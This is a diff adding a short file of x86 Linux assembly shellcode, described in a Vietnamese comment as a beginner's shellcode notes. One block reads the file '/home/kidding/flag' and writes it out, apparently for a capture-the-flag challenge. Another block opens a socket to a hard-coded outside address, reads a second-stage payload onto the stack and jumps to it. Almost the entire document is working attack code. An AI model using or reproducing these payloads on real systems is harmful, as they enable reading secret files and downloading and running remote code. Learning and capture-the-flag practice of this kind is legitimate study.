@@ -1,0 +1,63 @@
+// file nay la file code shellcode moi khoi dau khi con` xa la. :v
+
+----- open
+mov eax, 0x5
+push 0x00006761
+push 0x6c662f67
+push 0x6e696464
+push 0x696b2f65
+push 0x6d6f682f
+mov ebx, esp
+mov ecx, 0
+mov edx , 0x400
+int 0x80
+
+------ read
+mov ebx, eax
+mov eax, 0x3
+mov ecx, 0x080ea000
+mov edx, 0x40
+int 0x80
+
+------ write
+mov ebx, esi
+mov eax, 0x4
+mov ecx, 0x080ea000
+mov edx, 0x40
+int 0x80
+
+
+-----------------------------------------------
+
+--- tao socket
+push 0x6
+push 0x1
+push 0x2
+mov ecx, esp
+push 0x1
+pop ebx 
+mov al, 0x66
+int 0x80
+
+---- connect de lay them shellcode
+push 0x37776867
+push 0x672b0002
+mov edi, esp
+push 0x10
+push edi
+push eax
+mov ecx, esp
+mov bl, 0x3
+mov al, 0x66
+int 0x80
+
+
+------ read
+mov ebx, eax
+mov al, 0x3
+mov ecx, esp
+mov dl, 0x23
+int 0x80
+
+push esp
+ret
